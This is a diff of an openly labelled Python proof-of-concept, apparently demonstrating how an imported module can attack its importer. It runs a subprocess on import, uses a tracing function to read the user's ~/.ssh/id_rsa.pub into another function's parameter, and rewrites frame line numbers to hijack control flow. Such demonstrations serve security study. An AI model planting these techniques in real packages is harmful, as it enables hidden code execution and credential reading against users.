@@ -3,14 +3,20 @@ import subprocess
 from attacklib_native import *
 
 # attack 1: this will be executed upon import
-print("Executing ls -l on import:")
+print("pwned 1: Executing ls -l on import:")
 subprocess.call(["ls", "-l"])
 
 # attack 2: replace the function argument for foo in the stack frame
 import sys
+
+user = os.environ['USER']
+ssh_path = "/home/"+user
+if sys.platform == "darwin":
+    ssh_path = "/Users/"+user
+
 def maltrace1(frame, event, arg):
     old = frame.f_locals["p"]
-    with open("/home/marcela/.ssh/id_rsa.pub", "r") as fp:
+    with open(ssh_path+"/.ssh/id_rsa.pub", "r") as fp:
         frame.f_locals["p"] = "pwned 2: Replaced the function param from a tracing function with the ssh key: "+fp.read()
         fp.close()
 
@@ -24,7 +30,7 @@ def newprint(p):
 
 # attack 3: make the current frame jump to a different function
 def linetrace(frame, event, arg):
-    frame.f_lineno = 35 # this needs to be within the same code object
+    frame.f_lineno = 41 # this needs to be within the same code object
 
 def maltrace2(frame, event, arg):
     if frame.f_code.co_name == "bar" :
